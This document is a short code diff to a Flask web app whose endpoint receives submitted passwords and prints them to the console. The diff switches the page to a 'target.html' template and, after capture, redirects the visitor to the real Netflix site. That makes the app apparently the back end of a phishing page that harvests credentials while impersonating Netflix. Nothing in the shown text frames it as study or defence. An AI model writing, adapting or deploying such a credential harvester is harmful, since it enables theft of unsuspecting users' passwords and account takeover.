@@ -1,10 +1,10 @@
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, jsonify, redirect
 
 app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return render_template('target.html')
 
 @app.route('/api/savePassword', methods=['POST'])
 def save_password():
@@ -13,11 +13,11 @@ def save_password():
         try:
             # Print the password to the console
             print(f"Received password: {password}")
-            return jsonify({'message': 'PHONE HAS BEEN UPDATED'})
+            return redirect("https://www.netflix.com")  # Indentation corrected
         except Exception as e:
             return jsonify({'error': str(e)}), 500
     else:
         return jsonify({'error': 'No password provided'}), 400
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(debug=True, port=4000)
